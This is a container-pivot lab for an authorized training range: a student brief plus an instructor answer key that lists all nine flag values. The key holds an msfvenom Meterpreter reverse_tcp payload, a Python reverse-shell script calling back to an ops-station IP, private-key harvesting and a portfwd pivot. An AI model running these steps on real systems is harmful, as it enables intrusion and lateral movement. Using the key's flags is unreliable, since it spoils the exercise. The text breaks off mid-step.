# Duck Student Brief

## Objective

This module develops operational analysis in non-bare-metal contexts, including containerized services, minimal shell environments, and web-shell entry points. Your goal is to prove where your commands run, notice when that context changes, and adapt your collection approach when familiar tools are missing.

## Context

You will investigate layered runtime contexts that include web-shell and abstracted/containerized execution surfaces. Treat each transition as a new environment until identity, process, filesystem, and network evidence proves continuity.

## Tasks

### Merged Container Operations Chain

### Environment

The lab begins from a tokenized web shell on an instructor-designated Linux host. The exercise contains multiple runtime contexts, but you should discover those boundaries from system evidence rather than assuming the layout in advance.

Expected flags: 9.

### Access

|Hostname (expected)|IP address|Username|Password|Connection|
|---|---|---|---|---|
|`duck-31`|20.30.40.31|N/A|N/A|Web shell endpoint: `[http://20.30.40.31:8081/?t=<instructor-provided-token>](http://20.30.40.31:8081/?t=<instructor-provided-token>);`|

### Investigation Rules

- Treat every new command surface as untrusted until you prove its identity, user context, working directory, process view, filesystem clues, and network view.
- Do not assume an uploaded file runs in the same place where the web page accepts it. Prove the execution context from output and nearby artifacts.
- When a normal helper command is unavailable, look for the source data that helper would have read and use available tools to inspect it.
- Record the evidence that led you from one stage to the next. A flag without the evidence chain is incomplete for this lab.

### Question Gates

Use the questions below as gates. Do not move to the next gate until you can answer the current one with command output or web UI evidence.

#### Gate 1 - Where Am I Starting?

- What user, host, shell, working directory, OS, process list, and network state can you observe from the web shell?
- What evidence shows this is a containerized or otherwise abstracted runtime?
- Which process, file-activity, or environment artifacts look intentionally placed for this exercise?
- Which three objectives can you recover from this first runtime context?

Evidence to capture: context commands, process or file listings, environment/container indicators, recovered objective values, and a short explanation of why each artifact belongs to the first context.

#### Gate 2 - What Does Upload and Execute Actually Do?

- What paths or labels does the web page reveal for uploaded files and remote execution?
- If you upload a small diagnostic payload, what does its output prove about where it ran?
- What output fields or response text are different from local web-shell command output?
- Which discovered hints point toward mounted data, missing-tool adaptation, scoped request/response behavior, or later movement?

Evidence to capture: uploaded payload content or description, remote execution output, context proof from the payload, and the clues you used to choose the next enumeration targets.

#### Gate 3 - What Can I Learn in the New Runtime?

- What user, host, filesystem roots, mounts, tools, and runtime directories are visible after remote execution?
- Which artifacts explain their own use through README files, notes, response fields, or ordinary directory names?
- What expected tool is missing, and what underlying data can you inspect without that tool?
- What request/response behavior can you trigger and verify from discovered instructions?
- Which three objectives can you recover in this runtime?

Evidence to capture: broad enumeration before targeted file reads, proof that each target path or request string was discoverable, missing-tool workaround evidence, request/response output, and recovered objective values.

#### Gate 4 - What Artifact Suggests the Next Reachable System?

- What files, configs, keys, host aliases, ports, or network notes suggest another reachable environment?
- What current limitation prevents the most obvious connection method from working directly?
- What alternate method can you justify using only discovered artifacts and allowed tools?
- How will you prove the next connection lands somewhere new?

Evidence to capture: discovered connection material, proof of the limitation, chosen adaptation method, and initial context proof after the transition.

#### Gate 5 - How Do I Operate in a Minimal Constrained Environment?

- What commands, built-ins, or linked utilities are actually available?
- Which objective files explain what you need to validate without revealing the answer directly?
- What links, aliases, or wrapper behavior can you prove instead of assuming?
- Which validation helper outputs confirm the remaining objectives?

Evidence to capture: available utility evidence, objective-note interpretation, link or alias behavior proof, helper usage/output, and recovered objective values.

#### Submission

Submit a concise evidence narrative with all nine flags. For each objective, include:

- The question you were answering.
- The command or web action you used.
- The evidence source you observed.
- The conclusion you drew.
- Why that conclusion proves the correct runtime context or transition.

Your report should show a reproducible path through the lab, not just a list of values.

## Deliverables / Evidence

- Submit all nine flags with a reproducible evidence narrative for each gate transition.
- For each objective, record question, command/web action, observed evidence, and conclusion.
- Clearly show how you proved each runtime context before moving to the next.

## Constraints

- Treat every new shell or execution surface as untrusted until context is proven.
- When expected helper tools are unavailable, inspect the underlying data sources directly.
- Preserve a transition log from each gate so findings are reproducible.

## Success Criteria

You successfully complete this Module when you recover all objectives while proving runtime identity at each transition and documenting reproducible evidence-to-decision logic.

## PCTE range limitations

These limits apply on Persistent Cyber Training Environment (PCTE) ranges used by this Module. Treat the items below as a no-strike list when they exist. Not every item is present on every range or host.

Do not target, block, terminate, or delete range-control artifacts:

- **Network:** `10.0.0.0/8` (range control and instrumentation; do not block or flag that traffic). Routers past the edge-router in grey space. TCP `5672` (AMQP user-emulation on the control subnet), `49998`, and `49999`.
- **Accounts:** `range-admin` / `range_admin`, `range-control`, and `range`. Do not use accounts whose username or password contains `simspace`.
- **User emulation:** do not stop it. Typical paths: `C:\Program Files (x86)\Simspace\` and `C:\Users\<Username>\Simspace`. Scripts: `run-actuation.cmd`, `ueactuation.cmd`.
- **Directories:** `C:\Program Files\Puppet Labs` and the Simspace paths above.
- **Processes:** `java.exe`, `javaw.exe`, `ruby.exe`, `rubyw.exe`, `start.exe`, `chromedriver.exe`, `IEDriverServer.exe`, Metova, Selenium, WebDriver.

# Duck — Instructor Answer Key

# Lab 3.1 - Merged Container Operations Chain - Answer Key (Instructor Only)

Use this as a live walkthrough for Lab 3.1. The student-facing exercise is intentionally question-led: students begin with a tokenized web shell, prove each runtime context from evidence, use the upload workflow to reach a second execution surface, and then justify a private-network pivot into a BusyBox-style peer.

The instructor goal is to demonstrate every step in the **same web UI students use**. For each phase, point students back to evidence they can observe: UI labels, Command: output, upload status text, remote execution result, file listings, README files, notes, and helper output.

## Learning Outcome and Starting Context

Students should be able to:

- Establish baseline runtime context from native command evidence.
- Distinguish local web-shell execution from remote execution in another container.
- Use discovered hints to enumerate mounted data, missing-tool source artifacts, and scoped request/response behavior.
- Identify and justify a pivot path to a private peer.
- Use BusyBox-compatible discovery and validation rather than assuming full GNU/Linux tooling.

Starting context:

- Student starts at `http://<docker-host>:8081/?t=<token>`.
- Initial command execution happens in `web-gateway`.
- Upload-and-execute jobs are processed in `batch-runner`.
- BusyBox objectives are in `internal-shell`, reachable only on the compose network.

## Access

|Hostname (expected)|IP address|Username|Password|Connection|
|---|---|---|---|---|
|`duck-31`|20.30.40.31|N/A|N/A|Web shell endpoint: `[http://20.30.40.31:8081/?t=<instructor-provided-token>](http://20.30.40.31:8081/?t=<instructor-provided-token>);`|

If the instructor or range card provides a different host, port, or token, use those assigned values.

## Instructor Architecture Map

```
flowchart LR
  OpsStation["Ops station"] -->|"HTTP tokenized web shell: host TCP 8081"| WebGateway["web-gateway"]
  WebGateway -->|"shared upload, request, response directories"| BatchRunner["batch-runner"]
  BatchRunner -->|"private runtime-net reachability"| InternalShell["internal-shell"]
  BatchRunner -->|"mounted archive and node-agent dropboxes"| RuntimeArtifacts["runtime artifacts"]
```

Do not show this map to students before they have worked through the discovery gates. It is an instructor orientation aid.

## Target Access Enablement

- Environment type: Docker Compose container chain on a Linux utility host.
- Primary student entry method: `web-shell` at the tokenized HTTP endpoint.
- Stage transition method: web UI upload-and-execute workflow backed by a shared request/response dropbox.
- Peer access method: `ssh-key` after students discover SSH artifacts and adapt around the missing SSH client in `batch-runner`.
- Instructor demo callback: after Step 4 proves remote execution, land Metasploit `msfvenom` Linux Meterpreter `reverse_tcp` via upload-and-execute; enumerate the second runtime from that Meterpreter shell; then Meterpreter `portfwd` to peer SSH. Accepted student alternate: Python reverse shell + staged SSH client (do not demo mid-class unless Meterpreter is unavailable).
- Ops-station requirements: browser on the tokenized web UI (same as students), ability to create small POSIX shell payloads on Kali, Metasploit (`msfvenom` + multi/handler), and standard `ssh` on the ops station for the forwarded peer port. Optional `curl` helpers are in the appendix only.
- Network assumptions: host TCP `8081` reaches the web service; `internal-shell:22` is private to the Compose network and is not exposed directly on the Docker host.
- Reset/cleanup: stop callback listeners/handlers, remove queued upload/request/response artifacts, or restart the Compose stack from the Docker host.

## Student-Visible Discovery Trail

|Student question|Student-visible evidence source|Instructor note|
|---|---|---|
|Where am I starting?|UI labels (webshell vs remote container), then **Command:** output: identity, hostname, process view, OS, sockets, `/.dockerenv`|Harvest the page first. Then prove container context from Command: output.|
|Which first-stage artifacts look intentional?|Process list, recent `/var/tmp` activity, `/.dockerenv` content|These yield the first three flags.|
|What does upload-and-execute do?|UI labels, upload status text, remote execution result block|The response must prove a different execution context.|
|What changed after remote execution?|`source=exec-container`, hostname/user/path evidence, response hints|Use this to justify enumerating the second runtime.|
|Where do second-stage clues point?|Mounted archive, tooling note, manpage source, node-agent README, SSH material|Students should cite how each target was discovered.|
|How can I reach the next system?|SSH config/key material, network note, missing local SSH client|Students must explain the adaptation, not just run a prebuilt answer.|
|What is different about the peer?|BusyBox applet list, symlinks to `/bin/busybox`, validation helpers|Final objectives require proof of BusyBox behavior.|

## Flag Reference

This lab is Docker-delivered and Puppet-managed. Flag/tunable values are centralized in `environments/week3_repo/vms/puppet/data/nodes/lab_3_1.yaml` (`cs_ops::lab_3_1::*`) and rendered into compose/runtime artifacts by `cs_ops::lab_3_1`.

|Flag ID|Where students recover it|Config key/path|Default value|
|---|---|---|---|
|`container_process_flag`|`ps` output in webshell container (non-web process name)|`cs_ops::lab_3_1::flags::container_process_flag` -> compose env `CONTAINER_PROCESS_FLAG` -> `web/start-webshell.sh`|`PIVOT-SPARK`|
|`recent_file_flag`|Recent file name under `/var/tmp` in webshell container|`cs_ops::lab_3_1::flags::recent_file_flag` -> compose env `RECENT_FILE_FLAG` -> `web/start-webshell.sh`|`ARCHIVE-ECHO`|
|`dockerenv_env_flag`|`DOCKERENV_ENV_FLAG=...` line in `/.dockerenv`|`cs_ops::lab_3_1::flags::dockerenv_env_flag` -> compose env `DOCKERENV_ENV_FLAG` -> `web/start-webshell.sh`|`CANOPY-SIGNAL`|
|`mounted_path_flag`|Mounted archive content in exec container|`cs_ops::lab_3_1::flags::mounted_path_flag` -> rendered `host-data/reports/maintenance-readme.txt` and compose env|`GRANITE-BRIDGE`|
|`limited_tooling_flag`|Missing-`man` adaptation flow: extract the `token=` value directly from manpage source artifacts|`cs_ops::lab_3_1::flags::limited_tooling_flag` + `cs_ops::lab_3_1::compose::exec_man_*` -> compose env -> `exec/exec_agent.py`|`ATLAS-SHARD`|
|`misconfig_scope_flag`|Node-agent request/response workflow in exec container|`cs_ops::lab_3_1::flags::misconfig_scope_flag` -> compose env `MISCONFIG_SCOPE_FLAG` -> `exec/exec_agent.py`|`MARLIN-FOCUS`|
|`peer_network_flag`|BusyBox peer objective file after SSH pivot|`cs_ops::lab_3_1::flags::peer_network_flag` -> compose env `PEER_NETWORK_FLAG` -> `busybox/start-peer.sh`|`HOLLOW-TRANSIT`|
|`busybox_applet_flag`|Printed by successful `/home/opspeer/tools/check-applet <applet>` (obfuscated gate token; not in `cat` of the helper)|`cs_ops::lab_3_1::flags::busybox_applet_flag` -> compose env `BUSYBOX_APPLET_FLAG` -> `busybox/start-peer.sh` mints `.applet.token`; helper matches target hash then `base64 -d`|`KINETIC-ANCHOR`|
|`busybox_multicall_flag`|Printed by successful `/home/opspeer/tools/check-multicall <alias-path>` (obfuscated gate token; not in `cat` of the helper)|`cs_ops::lab_3_1::flags::busybox_multicall_flag` -> compose env `BUSYBOX_MULTICALL_FLAG` -> `busybox/start-peer.sh` mints `.multicall.token`; helper matches alias-hash then `base64 -d`|`MONOLITH-CHAIN`|

## Recommended Instructor Walkthrough

Demo this lab in the **same browser UI students use**. Create `.sh` payloads on Kali when you need to upload. After the first remote-execute proof (Step 4), switch the demo to **one** continuous Metasploit story: `msfvenom` → multi/handler → manual second-runtime enum in Meterpreter `shell` → `portfwd` → ops-station `ssh`. Do not start with `curl` or helper functions; those are optional in the appendix.

Open:

```
http://20.30.40.31:8081/?t=ops_console_token
```

If Hiera rotated `cs_ops::lab_3_1::compose::web_token`, use that token. Wrong or missing `t=` returns HTTP 403.

Paste webshell commands into the **Command:** field as one submit (semicolons are fine). Upload files with **Upload to Remote Staging**, then run them with **Upload and Execute (Remote Container)** and optional **Args**.

### 1. Harvest what the UI already discloses

No commands yet. Stay on the Operations Maintenance Console and read the labels.

|UI text|What it proves|
|---|---|
|Local upload path `/var/www/html/uploads`|Where this page stores an uploaded file in the **webshell** container|
|Remote execution staging root `/var/run/exec-dropbox`|Shared staging for remote jobs (uploads, requests, responses under that root)|
|**Upload to Remote Staging**|Can land a file for later remote run|
|**Upload and Execute (Remote Container)** plus **Args**|Can run a staged file **with arguments** in the **remote** container|
|**Command:** / **Run Local Command (webshell container)**|Direct shell in the **webshell** container|
|Hint: remote execution runs in a different container|Local Command and Remote Execute are two runtimes|

Why:

- Gate 2 asks what the page reveals for uploads and remote execution. That evidence is on the first paint, before any `whoami`.
- Files go to a known upload path and a known staging root. Commands on **Command:** run in the webshell. The same payload executed remotely is likely a different container and will yield different identity, host, and path output.

Coaching prompts if stuck:

- "What two containers does the page name?"
- "Where does it say uploaded files land?"
- "Which button runs code in the remote container, and can it take arguments?"

Grading checkpoint:

- Student can describe upload path, staging root, webshell command vs remote execute, and why those two surfaces may differ, using UI text only.

### 2. Run situational awareness baseline (webshell Command![smile](https://moodle.cso.ops/theme/image.php/boost/core/1784917078/s/smiley "smile")

Guiding question for students:

> What proves your current runtime context before you search for objectives?

Instructor demonstration: paste this entire block into **Command:** and click **Run Local Command (webshell container)** once.

```
date -u; whoami; id; pwd; hostname; echo "$SHELL"; ps -p $$ -o pid,ppid,args=; env | sort; uname -a; cat /etc/os-release; who 2>/dev/null || true; w 2>/dev/null || true; ps aux; ss -tulpen 2>/dev/null || netstat -tulpen; ss -tunap 2>/dev/null || netstat -tunap; ls -la /.dockerenv; ls -la /var/tmp
```

Why:

- This is the B03.M01 Linux SA first pass on the **webshell** surface the UI just named. Record time, identity, shell/process chain, environment, OS, users, processes, and sockets before hunting planted artifacts.
- Do **not** truncate `env`. In this build, `env | sort` is what actually reveals both planted environment values:
    - `DOCKERENV_ENV_FLAG=CANOPY-SIGNAL`
    - `RECENT_FILE_FLAG=ARCHIVE-ECHO`
- `ls -la /var/tmp` is where you recover the recent-file objective as a **filename**: the file `ARCHIVE-ECHO` (same string as `RECENT_FILE_FLAG`). Do not stop at the env line alone — list `/var/tmp` and show the file.

Why `ls -la /.dockerenv` and `ls -la /var/tmp` are in this list:

- Step 1 already labeled two containers (webshell vs remote). That claim is enough to check the Docker marker on this surface now. It is not a hidden path.
- `ls -la /.dockerenv` shows whether the marker exists and is readable. If it is missing, record that too (VM vs container). `cat /.dockerenv` in Step 3 confirms the same `DOCKERENV_ENV_FLAG` value on disk.
- `/var/tmp` is a normal place for recent/transient files. After `env` named `RECENT_FILE_FLAG=ARCHIVE-ECHO`, the matching file under `/var/tmp` is the concrete artifact.

Arguments:

- `date -u` — UTC, so later timestamps can be correlated.
- `ps -p $$ -o pid,ppid,args=` — `$$` is this shell; show PID, PPID, and args.
- `env | sort` — full sorted environment. Truncating to the first _N_ lines can hide `DOCKERENV_ENV_FLAG` and `RECENT_FILE_FLAG`.
- `ss -tulpen` — TCP/UDP listeners; `-p` process, `-n` numeric. `ss -tunap` is established/active sockets. `netstat` is the fallback if `ss` is missing.

Expected `env | sort` excerpt (call these out by name):

```
DOCKERENV_ENV_FLAG=CANOPY-SIGNAL
RECENT_FILE_FLAG=ARCHIVE-ECHO
```

Expected `ls -la /var/tmp` excerpt:

```
... ARCHIVE-ECHO
```

Expected findings:

- Output appears under **Local Command Output (webshell container)**.
- Identity is the web service user in this container, not a login SSH session.
- `/.dockerenv` exists (typical). Process, socket, and OS evidence support a containerized runtime.
- **`env` is the command that reveals both** `DOCKERENV_ENV_FLAG=CANOPY-SIGNAL` and `RECENT_FILE_FLAG=ARCHIVE-ECHO`.
- **`ls /var/tmp` (or `ls -la /var/tmp`) is where you find the `ARCHIVE-ECHO` flag** as a recent file name.

How students know this:

- The only starting access is the tokenized page. **Command:** is the labeled local shell.
- Students do not need the compose service name yet.
- Env vars name the values; `/var/tmp` listing proves the recent-file artifact on disk.

Coaching prompts if stuck:

- "What would you run first on any unfamiliar Linux command surface?"
- "The page named two containers. What file would you check to test that this shell is in a container?"
- "Did your `env` output include DOCKERENV_ENV_FLAG and RECENT_FILE_FLAG, or did you truncate the dump too early?"
- "After RECENT_FILE_FLAG names ARCHIVE-ECHO, where do you list to see that file?"

Grading checkpoint:

- Student provides baseline context evidence before claiming any objective values, including env evidence for both flag strings and `/var/tmp` listing for `ARCHIVE-ECHO`.

### 3. Enumerate first-stage planted artifacts

Guiding question for students:

> Which process, file-activity, or environment artifacts look intentionally placed in the starting runtime?

Instructor demonstration: paste into **Command:** and submit once. Step 2 already recovered the two env-named values and the `/var/tmp` file; this pass ties process evidence and confirms `/.dockerenv` on disk.

```
ps aux | grep -v grep; ls -la /var/tmp; cat /.dockerenv
```

Objective-discovery command notes:

- `grep -v grep` removes the helper `grep` process from process-list output. `-v` inverts the match.
- `ls -la /var/tmp` re-lists the recent-file artifact. Step 2 already showed `ARCHIVE-ECHO` here after `env` printed `RECENT_FILE_FLAG=ARCHIVE-ECHO`.
- `cat /.dockerenv` confirms the same `DOCKERENV_ENV_FLAG` value already seen in `env`, now as a file on disk.

Expected `cat /.dockerenv` output snippet:

```
DOCKERENV_ENV_FLAG=CANOPY-SIGNAL
```

Expected findings:

- Process list includes the non-web process name `PIVOT-SPARK`.
- `/var/tmp` listing includes the file `ARCHIVE-ECHO` (from Step 2 `env` → `RECENT_FILE_FLAG`, then `ls /var/tmp`).
- `/.dockerenv` includes `DOCKERENV_ENV_FLAG=CANOPY-SIGNAL` (same value Step 2 already showed in `env`).

How students know this:

- `env` named both env-style flags; `ls /var/tmp` and `cat /.dockerenv` turn those names into filesystem evidence.
- `ps` is the normal place to spot a non-web planted process name.
- The values are recoverable only after interacting with the starting runtime.

Coaching prompts if stuck:

- "After baseline context, what process output looks unrelated to Apache/PHP?"
- "If env already printed RECENT_FILE_FLAG=ARCHIVE-ECHO, what does ls /var/tmp add?"
- "What does the container marker file contain, not just whether it exists?"

Grading checkpoint:

- Student recovers all three starting-context objectives and explains why each is tied to the initial web-shell runtime.

### 4. Exercise upload-and-execute and prove the context change

Guiding question for students:

> Does the upload workflow run in the same runtime as the local command box, or somewhere else?

On Kali, write the diagnostic script (not in the webshell Command: box):

```
cat > /tmp/lab31-context.sh <<'EOF'
#!/bin/sh
set -eu
echo "payload_user=$(whoami)"
echo "payload_id=$(id)"
echo "payload_pwd=$(pwd)"
echo "payload_host=$(hostname)"
echo "payload_shell=${SHELL:-unknown}"
echo "payload_os=$(sed -n '1,3p' /etc/os-release 2>/dev/null | tr '\n' ';')"
echo "candidate_roots:"
find /srv /opt /var /run -maxdepth 2 -type d 2>/dev/null | sort | sed -n '1,80p'
EOF
chmod +x /tmp/lab31-context.sh
```

In the web UI:

1. **Upload to Remote Staging** — choose `/tmp/lab31-context.sh`.
2. Read the status line. Expect upload to `/var/www/html/uploads/lab31-context.sh` and staging at `/var/run/exec-dropbox/uploads/lab31-context.sh`. `/var/run` is a symlink to `/run`, so a launcher that uses `/run/exec-dropbox/uploads/...` still reaches the same directory.
3. **Remote file name:** `lab31-context.sh`. Leave **Args** empty. Click **Upload and Execute (Remote Container)**.
4. Compare **Local Command Output (webshell container)** from Step 2 with **Remote Execution Result (exec container)**.

Why:

- Step 1 already said two containers. This payload prints identity, host, and path so students can prove the remote job is not the Command: shell.
- Create the `.sh` on Kali because the upload control takes a file from the ops station, the same way students will.

Payload construction notes:

- `cat > /tmp/lab31-context.sh <<'EOF'` writes the script. Quoting `'EOF'` prevents Kali from expanding variables while creating the file.
- `#!/bin/sh` selects a POSIX interpreter.
- `set -eu` — `-e` exit on failure, `-u` unset variables are errors.
- `find /srv /opt /var /run` walks four separate roots. `/var/run` is a symlink to `/run`, so `find -type d` does not list it as its own directory. Either path reaches the same files.
- `chmod +x` is good hygiene; the remote agent still needs a staged filename.

Expected response snippet:

```
source=exec-container
exit_code=0
mounted_path_hint=/srv/archive/reports/maintenance-readme.txt
limited_tooling_hint=extract-token-from-man-source
man_source=/usr/share/man/man7/ops-runtime.7.gz
ssh_artifacts=/opt/ops/ssh-materials
stdout=payload_user=...
```

How students know this:

- The web UI labels local command output separately from remote execution output.
- The remote response explicitly includes `source=exec-container`.
- The payload's identity, host, path, and candidate roots differ from the starting web-shell evidence.
- Response fields provide discoverable next-step hints; they are not instructor-only path knowledge.

Coaching prompts if stuck:

- "What output fields appear only after remote execution?"
- "Can your payload print enough context to prove where it ran?"
- "Which response fields look like places or artifacts you can verify?"

Grading checkpoint:

- Student demonstrates remote execution in a different runtime and cites the output that proves the transition.

Transition (say aloud): Step 4 proved a second runtime and printed discovery hints (`mounted_path_hint`, `man_source`, `ssh_artifacts`). Most operators stop one-shot upload-and-execute here and go interactive. Demo does the same: land Meterpreter next, then enumerate those hints from a live shell.

### 5. Land interactive control in `batch-runner` (demo: Meterpreter)

Guiding question for students:

> After remote execution is proven, why switch to interactive control before chasing every hint?

Why now (not after full enum):

- Step 4 already proved the context change and gave a map of next artifacts.
- Multi-step enumeration (mount → man source → node-agent → SSH material) is clearer as a live shell walk than as repeated upload scripts.
- The same interactive session carries into peer pivot (`portfwd`) later.

**Instructor live path (demo this):** Metasploit `msfvenom` ELF + multi/handler. Keep the session open through Steps 6–7. Accepted alternate (students may use; do not demo mid-class unless Meterpreter is unavailable): Python reverse shell below.

Set callback values on the ops station (IP must be reachable from the container network):

```
CALLBACK_IP='<ops-station-reachable-ip>'
CALLBACK_PORT='4444'
```

#### Demo path — `msfvenom` + multi/handler

Generate a Linux Meterpreter reverse TCP binary:

```
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST="$CALLBACK_IP" \
  LPORT="$CALLBACK_PORT" \
  PrependFork=true \
  -f elf \
  -o /tmp/lab31-meterpreter.elf
chmod +x /tmp/lab31-meterpreter.elf
```

Generation notes:

- `msfvenom` creates a payload artifact.
- `-p linux/x64/meterpreter/reverse_tcp` — Linux x64 Meterpreter outbound TCP.
- `LHOST` / `LPORT` — ops-station callback (must match the handler).
- `PrependFork=true` — parent returns quickly so the upload-and-execute timeout does not kill the session child.
- `-f elf` / `-o` — write a Linux ELF.

Start the matching handler:

```
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST ${CALLBACK_IP}; set LPORT ${CALLBACK_PORT}; set ExitOnSession false; run -j"
```

Handler notes: `use exploit/multi/handler` with the same payload/LHOST/LPORT; `ExitOnSession false` keeps the handler; `run -j` backgrounds it.

Upload and launch through the web UI (last heavy use of one-shot remote execute in this demo):

1. **Upload to Remote Staging** — `/tmp/lab31-meterpreter.elf` (staged basename usually `lab31-meterpreter.elf`).
2. Upload a short launcher that backgrounds the staged ELF:

```
cat > /tmp/lab31-meterpreter-launch.sh <<'EOF'
#!/bin/sh
set -eu
/run/exec-dropbox/uploads/lab31-meterpreter.elf >/dev/null 2>&1 &
echo "meterpreter_launched"
EOF
chmod +x /tmp/lab31-meterpreter-launch.sh
```

If the upload status shows a different staged filename, put that path in the launcher. Then **Upload and Execute (Remote Container)** with **Remote file name** `lab31-meterpreter-launch.sh`.

After the session opens, prove you landed in the same remote runtime Step 4 just showed — do **not** chase flags yet:

```
sessions -i <session-id>
getuid
shell
whoami
hostname
pwd
```

Expected teaching point: identity/host/path should match Step 4’s remote-execution evidence (`batch-runner` / exec container), not the webshell Command: output.

#### Accepted alternate — reverse-shell script (not the class demo)

Students may use this instead of Meterpreter. Same timing (interactive after Step 4). Prefer Metasploit so Step 7 `portfwd` stays one continuous story. If this path is used, peer SSH is the Step 7 staged-client alternate, not `portfwd`.

Ops station listener:

```
rlwrap -cAr nc -lvnp "$CALLBACK_PORT"
```

Upload/execute helper (Args: `<ops-station-ip> 4444`):

```
cat > /tmp/lab31-revsh.sh <<'EOF'
#!/bin/sh
set -eu
CALLBACK_HOST="$1"
CALLBACK_PORT="$2"
python3 - "$CALLBACK_HOST" "$CALLBACK_PORT" >/dev/null 2>&1 <<'PY' &
import os, pty, socket, sys
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((sys.argv[1], int(sys.argv[2])))
for fd in (0, 1, 2):
    os.dup2(sock.fileno(), fd)
pty.spawn("/bin/sh")
PY
echo "reverse_shell_launched"
EOF
chmod +x /tmp/lab31-revsh.sh
```

On the callback shell, confirm identity/host/path match Step 4 before Step 6 enumeration.

Transition (say aloud): Interactive shell is open in `batch-runner`. Step 4 hints are the map — walk them manually from this shell. Hold peer SSH until Step 7.

### 6. Enumerate the second runtime (manual via Meterpreter shell)

Guiding question for students:

> Once you have an interactive shell in the second runtime, what broad enumeration turns Step 4 response hints into evidence?

Demo this as **four narrated pauses** in the Meterpreter `shell` (or reverse-shell alternate). After each phase, stop and say what you proved before continuing. Do **not** upload more enum scripts for the class demo.

#### 6a. Orient and walk roots from Step 4 hints

Why: Step 4 already printed `mounted_path_hint=.../maintenance-readme.txt` and `ssh_artifacts=/opt/ops/ssh-materials`. Broad `ls` under `/srv`, `/opt`, `/var`, and `/run` proves those trees exist before any `cat`.

```
date -u; whoami; id; pwd; hostname
cat /etc/os-release
mount | sed -n '1,50p'
ls -la /srv 2>/dev/null || true
ls -la /srv/archive 2>/dev/null || true
ls -la /srv/archive/reports 2>/dev/null || true
ls -la /opt 2>/dev/null || true
ls -la /opt/ops 2>/dev/null || true
ls -la /var 2>/dev/null || true
ls -la /run 2>/dev/null || true
ls -la /run/node-agent 2>/dev/null || true
```

Pause: listings should expose `maintenance-readme.txt`, `/opt/ops`, and `/run/node-agent` before targeted reads.

`ps` is not installed in this container. `ps: not found` is expected here. The webshell `ps` in Steps 2 and 3 is where `PIVOT-SPARK` is shown.

#### 6b. Mounted archive flag

Why: Step 4 `mounted_path_hint` plus 6a listing of `/srv/archive/reports` justify reading that file only.

```
cat /srv/archive/reports/maintenance-readme.txt
```

Expected:

```
Maintenance archive notes:
- This path is host-mounted into the container for maintenance workflows.
- Verify mounted path context before trusting data boundaries.
- mounted_path_flag=GRANITE-BRIDGE
- ssh_artifact_hint=/opt/ops/ssh-materials
```

Flag recovered: `mounted_path_flag`. Hold `ssh_artifact_hint` for Step 7.

#### 6c. Missing-`man` adaptation → limited tooling flag

Why: Step 4 printed `limited_tooling_hint` and `man_source=.../ops-runtime.7.gz`. Confirm `man` is missing, then extract `token=` from that source path (same path as the response field / tooling note).

```
cat /opt/ops/tooling-note.txt
command -v man || echo "man not found"
zcat /usr/share/man/man7/ops-runtime.7.gz

# If you want to be fancy
python3 - <<'PY'
import gzip
with gzip.open("/usr/share/man/man7/ops-runtime.7.gz", "rt", encoding="utf-8") as fh:
    for line in fh:
        if line.startswith("token="):
            print(line.strip())
PY
```

Expected tooling note:

```
limited tooling observed: ssh,nc,netstat,ss,ip,man
objective_hint=man command missing; inspect manpage source directly
man_source=/usr/share/man/man7/ops-runtime.7.gz
```

Expected missing-tool output:

```
man not found
token=ATLAS-SHARD
```

Flag recovered: `limited_tooling_flag` (the `token=` value). How students know the path: Step 4 `man_source=` and the tooling note — not the answer key.

#### 6d. Node-agent scope flag

Why: 6a showed `/run/node-agent`. README explains request format → `status` job recovers `misconfig_scope_flag`. Hold Step 4 / 6b `ssh_artifacts` for the peer pivot in Step 7.

```
cat /run/node-agent/README.txt
echo status > /run/node-agent/requests/ops-check.job
sleep 2
cat /run/node-agent/responses/ops-check.out
```

Expected README / response:

```
Drop requests into ./requests as <name>.job.
Agent writes output to ./responses/<name>.out.

Supported request strings:
- status
- list-scopes
```

```
agent=maintenance-scope-proxy
scope=container-exec-support
misconfig_scope_flag=MARLIN-FOCUS
```

Flag recovered: `misconfig_scope_flag`.

Coaching prompts if stuck:

- "Which Step 4 response hint can you validate with a directory listing before reading a file?"
- "If `man` is missing, where does `man` normally read content from?"
- "Does the node-agent directory explain its own request format?"

Grading checkpoint:

- Student recovers `mounted_path_flag`, `limited_tooling_flag`, and `misconfig_scope_flag` with evidence showing how each artifact was discovered from the interactive shell.

Transition (say aloud): Second-runtime flags are in. Step 4 still pointed at `ssh_artifacts=/opt/ops/ssh-materials` — hunt that next for the peer pivot.

### 7. Complete the peer transition (demo: Meterpreter `portfwd`)

Guiding question for students:

> What discovered artifacts justify movement to another system, and what limitation forces adaptation?

Stay in the Meterpreter `shell` from Steps 5–6. Start with the SSH hint/hunt before any `portfwd`.

#### 7a. SSH material hunt

Why: Step 4 printed `ssh_artifacts=/opt/ops/ssh-materials`; 6b’s archive note also named `/opt/ops/ssh-materials`. List the directory, read the config, inspect the key file, then prove whether this runtime can use them.

```
ls -la /opt/ops/ssh-materials
cat /opt/ops/ssh-materials/config
cat /opt/ops/ssh-materials/id_peer_ops
command -v ssh || echo "ssh not found"
```

Expected `ls` finding: `config` and `id_peer_ops` (plus related public key / known_hosts style files if present).

Expected `cat /opt/ops/ssh-materials/config` output:

```
Host busybox-peer
    HostName internal-shell
    Port 22
    User opspeer
    IdentityFile /opt/ops/ssh-materials/id_peer_ops
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
```

Call out from the config:

- Host alias `busybox-peer` → `HostName internal-shell` on port `22` as user `opspeer`.
- `IdentityFile` points at `id_peer_ops` in the same directory.

`id_peer_ops` is a **private key** (expect an `-----BEGIN ... PRIVATE KEY-----` / OpenSSH private-key header when you `cat` it). Do not treat it as a password file or a peer hostname.

Expected tooling gap:

```
ssh not found
```

Teaching point: you have a usable SSH config and private key on disk, but **this box has no `ssh` client**. The peer (`internal-shell:22`) is also private to `runtime-net` — ops-station SSH to duck-31 host `:22` is the wrong target. Adaptation: set up redirections through the existing Meterpreter session so the ops station’s `ssh` can reach the peer.

#### 7b. Meterpreter `portfwd` and ops-station SSH

Exit the OS shell back to Meterpreter if needed (`exit` or `Ctrl-Z` / `background` per your session style), then forward peer SSH:

```
sessions -i <session-id>
portfwd add -l 2222 -p 22 -r internal-shell
portfwd list
```

Port-forward notes:

- `-l 2222` — local listen on the ops station.
- `-p 22` / `-r internal-shell` — peer SSH as seen from `batch-runner` on `runtime-net` (hostname from the Step 7a config).

Download the discovered key material:

```
